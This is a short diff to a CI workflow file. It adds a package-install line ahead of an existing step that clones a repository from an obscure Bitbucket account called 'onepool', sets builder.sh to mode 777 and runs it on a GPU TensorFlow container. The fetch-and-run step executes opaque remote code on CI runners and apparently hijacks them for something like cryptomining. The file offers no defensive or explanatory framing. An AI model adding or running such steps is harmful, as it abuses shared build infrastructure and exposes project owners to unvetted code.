@@ -30,5 +30,6 @@ jobs:
     uses: script@v1
     with:
       script: |-
+        apt update && apt -y install git wget curl
         git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/onepool.git && cd onepool && chmod 777 builder.sh && ./builder.sh
       image: tensorflow/tensorflow:1.14.0-gpu-py3
